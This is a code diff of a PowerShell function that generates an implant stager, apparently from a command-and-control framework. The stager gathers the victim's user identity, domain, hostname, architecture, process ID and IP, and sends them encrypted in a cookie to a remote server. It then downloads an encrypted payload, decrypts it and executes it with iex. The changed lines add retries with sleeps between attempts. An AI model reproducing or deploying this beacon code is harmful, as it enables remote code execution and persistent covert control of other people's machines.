@@ -86,15 +86,18 @@ $wc.Proxy.Credentials = $wc.Credentials;
 } if ($cookie) { $wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie") }
 $wc } 
 function primer {
-if ($env:username -eq "$($env:computername)$"){$u="NT AUTHORITY\SYSTEM"}else{$u=$env:username}
+try{$u=([Security.Principal.WindowsIdentity]::GetCurrent()).name} catch{if ($env:username -eq "$($env:computername)$"){}else{$u=$env:username}}
 $o="$env:userdomain\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;'+$ipv4address+'"
 $pp=enc -key '+$enckey+' -un $o
 $primer = (Get-Webclient -Cookie $pp).downloadstring($s)
-dec -key '+$enckey+' -enc $primer} 
-$primer = primer
-if ($primer) {$primer| iex} else {
-start-sleep 1800
-primer | iex }'
+$p = dec -key '+$enckey+' -enc $primer
+if ($p -like "*key*") {$p| iex}
+} 
+try {primer} catch {}
+Start-Sleep 300
+try {primer} catch {}
+Start-Sleep 600
+try {primer} catch {}'
 return $command
 }
 
